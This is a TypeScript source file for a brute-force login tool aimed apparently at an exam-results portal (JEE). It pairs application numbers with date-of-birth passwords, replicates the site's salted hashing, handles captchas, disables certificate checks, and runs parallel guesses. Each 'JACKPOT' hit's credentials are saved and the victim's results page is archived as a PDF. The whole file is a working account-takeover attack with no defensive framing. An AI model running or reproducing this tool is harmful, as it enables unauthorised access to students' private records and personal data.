import axios from "axios";
import https from "https";
import crypto from "crypto";
import { CONFIG, HEADERS } from "./config";
import { SessionManager } from "./session";
import { AuthResult } from "./types";
import { logger } from "./logger";
import { PDFGenerator } from "./pdf";
import fs from "fs-extra";
import path from "path";

export class BruteForceEngine {
  private sessionManager = new SessionManager();
  private agent = new https.Agent({
    rejectUnauthorized: false,
    keepAlive: true,
    maxSockets: 50,
  });

  private encryptPassword(password: string, salt: string): string {
    const hash1 = crypto
      .createHash("sha256")
      .update(password)
      .digest("hex")
      .toUpperCase();
    const hash2 = crypto
      .createHash("sha256")
      .update(hash1 + salt)
      .digest("hex")
      .toUpperCase();
    return hash2;
  }

  async testCombination(
    appNo: string,
    dob: string,
  ): Promise<AuthResult & { captchaError?: boolean }> {
    const session = await this.sessionManager.getSession();
    if (!session)
      return {
        success: false,
        applicationNo: appNo,
        password: dob,
        error: "Session Error",
      };

    const payload = new URLSearchParams({
      ApplicationNo: appNo,
      Password: this.encryptPassword(dob, session.salt),
      Captcha1: session.captcha,
    });

    try {
      const response = await axios.post(
        `${CONFIG.baseUrl}${CONFIG.loginPath}`,
        payload.toString(),
        {
          httpsAgent: this.agent,
          headers: {
            ...HEADERS,
            Cookie: session.cookies,
            Referer: `${CONFIG.baseUrl}${CONFIG.loginPath}`,
            "Content-Length": payload.toString().length.toString(),
          },
          maxRedirects: 0,
          timeout: 10000,
          validateStatus: (status) => status < 500,
        },
      );

      const data = String(response.data);
      const redirectUrl = response.headers.location || "";

      if (
        data.includes("Invalid Application Number/Password") ||
        data.includes("Invalid Credentials") ||
        redirectUrl.includes("error") ||
        (response.status === 302 && redirectUrl.includes("Login"))
      ) {
        return { success: false, applicationNo: appNo, password: dob };
      }

      if (data.includes("Invalid Captcha") || data.includes("Security Pin")) {
        return {
          success: false,
          applicationNo: appNo,
          password: dob,
          captchaError: true,
        };
      }

      const isSuccess =
        (response.status === 302 &&
          (redirectUrl.includes("Dashboard") ||
            redirectUrl.includes("Home"))) ||
        (data.includes("Welcome") &&
          (data.includes("Logout") || data.includes("Sign Out")));

      if (isSuccess) {
        return {
          success: true,
          applicationNo: appNo,
          password: dob,
          html: data,
        };
      }

      return { success: false, applicationNo: appNo, password: dob };
    } catch (error: any) {
      return {
        success: false,
        applicationNo: appNo,
        password: dob,
        error: error.message,
      };
    }
  }

  async run(appNumbers: string[], passwords: string[]): Promise<boolean> {
    let totalTestedInBatch = 0;

    // Heartbeat logic to prove life every 30 seconds
    const heartbeat = setInterval(() => {
      logger.info(
        `💓 HEARTBEAT: Process Alive. Total combinations tested this batch: ${totalTestedInBatch}`,
      );
    }, 30000);

    try {
      for (const appNo of appNumbers) {
        const CHUNK_SIZE = 15;
        for (let i = 0; i < passwords.length; i += CHUNK_SIZE) {
          const chunk = passwords.slice(i, i + CHUNK_SIZE);
          const results = await Promise.all(
            chunk.map((pwd) => this.testCombination(appNo, pwd)),
          );

          totalTestedInBatch += chunk.length;
          process.stdout.write(
            `\r[ACTIVE HUNT] Testing: ${appNo} | DOBs: ${i}-${i + CHUNK_SIZE} | Total: ${totalTestedInBatch}`,
          );

          for (const result of results) {
            if (result.success) {
              clearInterval(heartbeat);
              console.log("\n");
              logger.info(
                `🎯 JACKPOT! [${result.applicationNo}] : [${result.password}]`,
              );
              await this.handleSuccess(result);
              return true; // Stop current batch and index.ts loop can decide what's next
            }
            if (result.captchaError) {
              logger.warn(
                `\n🔄 Captcha invalidated on ${appNo}. Regenerating...`,
              );
              await this.sessionManager.getSession(true);
              i -= CHUNK_SIZE; // Retry
              break;
            }
          }
          await new Promise((resolve) => setTimeout(resolve, 150));
        }
      }
      return false;
    } finally {
      clearInterval(heartbeat);
    }
  }

  private async handleSuccess(result: AuthResult) {
    const finalDir = path.join(process.cwd(), "results");
    await fs.ensureDir(path.join(finalDir, "pdfs"));

    const logEntry = `
================================================
✅ SUCCESSFUL LOGIN DETECTED
================================================
APP NUMBER: ${result.applicationNo}
PASSWORD  : ${result.password}
TIMESTAMP : ${new Date().toLocaleString()}
================================================
`;

    console.log(logEntry);
    await fs.appendFile(path.join(finalDir, "verified_hits.txt"), logEntry);

    if (result.html) {
      try {
        await PDFGenerator.generate(result.applicationNo, result.html);
        logger.info(
          `✅ PHYSICAL EVIDENCE ARCHIVED: results/pdfs/JEE_Result_${result.applicationNo}.pdf`,
        );
      } catch (err: any) {
        logger.error(
          `Hit found but PDF render failed: ${err.message}. USE THE CREDENTIALS ABOVE.`,
        );
      }
    }

    process.exit(0);
  }
}
